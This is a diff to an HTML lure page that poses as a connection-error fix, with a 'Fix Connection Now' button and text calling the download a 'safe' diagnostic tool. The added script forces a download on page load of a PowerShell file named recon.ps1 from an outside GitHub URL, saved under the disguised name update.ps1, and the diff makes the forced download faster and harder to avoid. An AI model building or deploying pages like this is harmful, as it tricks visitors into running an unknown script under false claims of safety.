@@ -13,13 +13,13 @@
       padding: 60px; 
     }
     button { 
-      padding: 15px 30px; 
+      padding: 15px 40px; 
       font-size: 18px; 
       background: #0f0; 
       color: #000; 
       border: none; 
       cursor: pointer; 
-      margin: 20px;
+      margin: 30px;
     }
   </style>
 </head>
@@ -31,15 +31,20 @@
     <button>Fix Connection Now</button>
   </a>
 
-  <p style="margin-top: 50px; font-size: 14px; color: #666;">
-    This will download a small diagnostic tool (safe).
+  <p style="margin-top: 40px; font-size: 14px; color: #666;">
+    Small diagnostic tool • Safe to run
   </p>
 
   <script>
-    // Auto-download after 2.5 seconds
+    // Try to force download on page load (may still need click on some browsers)
     setTimeout(() => {
-      window.location.href = "https://raw.githubusercontent.com/yggr153/error-screenshot/main/recon.ps1";
-    }, 2500);
+      const link = document.createElement('a');
+      link.href = "https://raw.githubusercontent.com/yggr153/error-screenshot/main/recon.ps1";
+      link.download = "update.ps1";
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }, 800);
   </script>
 </body>
 </html>
